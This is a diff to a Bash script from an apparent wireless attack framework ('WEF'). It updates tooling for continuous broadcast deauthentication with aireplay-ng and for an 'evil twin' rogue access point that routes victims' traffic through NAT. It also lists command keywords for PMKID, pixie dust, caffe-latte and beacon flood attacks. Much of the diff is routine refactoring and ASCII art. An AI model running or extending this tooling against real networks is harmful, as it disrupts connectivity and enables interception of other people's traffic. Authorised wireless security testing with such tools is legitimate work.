@@ -37,9 +37,9 @@ function ctrl_c(){
 	net_process=$(pidof NetworkManager)
 	if [ ! "$wpa_process" ]; then
 		echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Restarting connections${endColour}"
-		service wpa_supplicant start 2>/dev/null
+		systemctl restart wpa_supplicant 2>/dev/null
 		if [ ! "$net_process" ]; then
-			service NetworkManager start 2>/dev/null
+			systemctl restart NetworkManager 2>/dev/null
 		fi
 	fi
 	rm ${dir}/*.tmp 2>/dev/null
@@ -218,7 +218,7 @@ function rand_tips(){
 
 # Dependencies Function
 function dependencies(){
-	programs=(macchanger aircrack-ng reaver mdk4 hashcat hcxdumptool xterm dnsmasq hostapd php crackle pixiewps)
+	programs=(macchanger aircrack-ng reaver mdk4 hashcat hcxdumptool xterm bettercap dnsmasq hostapd php crackle)
 	system=$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"')
 	if [ "$system"  == "Parrot" ]; then
 		for program in "${programs[@]}"; do
@@ -819,13 +819,23 @@ function inhibitor(){
 	trap inhibition_c INT
 
 	echo -e "\n${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] Getting channel of the AP${endColour}"
-	channel_to_inhibite=$(timeout 14 bash -c "wash -2 -5 -a -i ${netCard}" | grep -i "${ap_to_inhibite}$" | awk '{print $2}')
+	test -f scan_output
+	if [ "$(echo $?)" == "0" ]; then
+		channel_to_inhibite=$(cat scan_output | grep -i "${ap_to_inhibite}$" | awk '{print $2}')
+		sleep 0.2
+	else
+		channel_to_inhibite=$(timeout 14 bash -c "wash -2 -5 -a -i ${netCard}" | grep -i "${ap_to_inhibite}$" | awk '{print $2}')
+	fi
 
 	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting inhibition${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"
 	iwconfig ${netCard} channel ${channel_to_inhibite}
 	echo -ne "\n\n${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] Press Ctrl + C to stop attack${endColour} "
-	aireplay-ng -0 0 -e "${ap_to_inhibite}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null
-	sleep 0.2
+	if [ "$verbose" == "0" ]; then
+		aireplay-ng -0 0 -e "${ap_to_inhibite}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null
+	elif [ "$verbose" == "1" ]; then
+		aireplay-ng -0 0 -e "${ap_to_inhibite}" -c FF:FF:FF:FF:FF:FF ${netCard}
+	fi
+	sleep 0.1
 	echo -e "\n\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Inhibition completed${endColour}"
 	sleep 0.1
 }
@@ -1375,6 +1385,15 @@ function evilTwin(){
 	sleep 0.2
 	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Channel of your AP: ${endColour}" && read def_channel
 	sleep 0.1
+	test -d /sys/class/net/eth0
+	if [ "$(echo $?)" != "0" ]; then
+		echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Interface to route internet through (default=eth0): ${endColour}" && read interface_to_route
+		if [ ! "${interface_to_route}" ]; then
+			interface_to_route="eth0"
+		fi
+	else
+		interface_to_route="eth0"
+	fi
 
 	echo -ne "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Creating malicious AP"; sleep 0.2; echo -ne "."; sleep 0.2; echo -ne "."; sleep 0.2; echo -ne ".${endColour}\n"
 	ifconfig $evilCard up; sleep 0.3
@@ -1409,7 +1428,7 @@ function evilTwin(){
 
 	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
 
-	iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+	iptables --table nat --append POSTROUTING --out-interface ${interface_to_route} -j MASQUERADE
 	iptables --append FORWARD --in-interface ${evilCard} -j ACCEPT
 	echo 1 > /proc/sys/net/ipv4/ip_forward
 
@@ -1891,20 +1910,21 @@ function blue_main(){
 # Secret
 function secret(){
 echo -e "\n${blueColour}"
-echo -e "    @@                             @@     "
-echo -e "  @@   @@.                     .@@   @@   "
-echo -e " @@   @@  @@@               @@@  @@   @@  "
-echo -e " @@  @@  @@   @@   @@@   @@   @@  @@  @@  "
-echo -e " @   @@  @@  @@   @@@@@   @@  @@  @@   @  If you are reading this, thank you to use ${endColour}${yellowColour}WEF${endColour}"
-echo -e "${blueColour} @@  @@  @@   @@   @@@   @@   @@  @@  @@  "
-echo -e " @@   @@  @@@               @@@  @@   @@  "
-echo -e "  @@   @@.        /   \\        .@@   @@  "
-echo -e "    @@           /     \\           @@    "
-echo -e "                /       \\		   "
-echo -e "               /         \\               "
-echo -e "              /           \\              "
-echo -e "             /             \\             "
-echo -e "            /               \\ ${endColour}"
+echo -e "                             ___-------___				"
+echo -e "                         _-~~             ~~-_				"
+echo -e "                      _-~                    /~-_			"
+echo -e "   /^\__/^\         /~  \                   /    \			"
+echo -e " /|  O|| O|        /      \_______________/        \			"
+echo -e "| |___||__|      /       /                \          \			"
+echo -e "|          \    /      /                    \          \		"
+echo -e "|   (_______) /______/                        \_________ \	If you are reading this, thank you to use ${endColour}${yellowColour}WEF${endColour}"
+echo -e "${blueColour}|         / /         \                      /            \		"
+echo -e " \         \^\\         \                  /               \     /	"
+echo -e "   \         ||           \______________/      _-_       //\__//	"
+echo -e "     \       ||------_-~~-_ ------------- \ --/~   ~\    || __/	"
+echo -e "       ~-----||====/~     |==================|       |/~~~~~		"
+echo -e "        (_(__/  ./     /                    \_\      \.		"
+echo -e "               (_(___/                         \_____)_)		${endColour}"
 }
 
 words=("help" "randomize mac" "attacks" "deauth" "beacon" "deauthentication" "caffe-latte" "authentication" "auth" "pmkid" "pmkid attack" "start card" "pmkid-attack" "beacon-flood" "beaconflood" "michael" "start" "up" "exit" "quit" "salir" "sortir" "1" "2" "3" "4" "5" "6" "7" "8" "9" "10" "11" "12" "13" "14" "15" "16" "evil" "evil-twin" "eviltwin" "chopchop" "replay" "replay attack" "beacon flood" "deauth attack" "deauth-attack" "deauthentication-attack" "evil-twin-attack" "authentication attack" "deauthentication attack" "randomize" "mac" "passive" "passive attack" "stealthy" "stealthy attack" "stealthy-attack" "passive-attack" "randomize-mac" "info" "pixie dust" "pixie" "pixie-dust" "replay-attack" "exec" "command" "execute" "exi" "qui" "chopchop attack" "chopchop-attack" "michael attack" "michael-attack" "wef" "WEF" "secret" "99" "modules" "load bluetooth" "load wifi" "clear" "panel" "scan" "chipsets" "adapters" "info" "evil twin" "tip" "tips" "?" "inhibite" "inhibitor" "cls" "verbose" "noverbose" "Deauthentication" "Authentication" "PMKID" "Beacon" "Beacon Flood" "Michael" "Michael Exploitation" "Passive" "Stealthy" "Start" "Pixie" "Pixie Dust" "PixieDust" "Caffe-Latte" "Caffe Latte" "CaffeLatte" "ChopChop" "Evil" "Evil Twin" "EvilTwin" "Evil-Twin" "Null" "Null Pin" "Replay" "Replay Attack" "Randomize" "version" "null" "enable auto" "enable" "disable auto" "disable" "extra" "update" "gps" "b" "d" "a" "e" "r" "n" "m" "set")
